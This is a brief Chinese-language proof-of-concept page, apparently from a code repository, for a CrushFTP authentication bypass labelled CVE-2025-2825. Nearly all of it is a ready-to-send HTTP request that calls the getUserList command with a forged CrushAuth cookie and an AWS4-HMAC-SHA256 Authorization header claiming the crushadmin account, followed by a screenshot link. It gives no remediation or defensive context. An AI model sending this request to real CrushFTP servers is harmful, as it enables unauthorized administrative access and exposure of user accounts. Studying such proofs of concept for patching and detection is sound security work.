
## CrushFTP身份验证绕过(CVE-2025-2825)

## poc
```javascript
GET /WebInterface/function/?command=getUserList&c2f=1111 HTTP/1.1
Host: target-server:8081
Cookie: CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/

```

![image](https://github.com/user-attachments/assets/6d6a18ba-3b8b-4c65-97c0-ad24cb59e1b2)
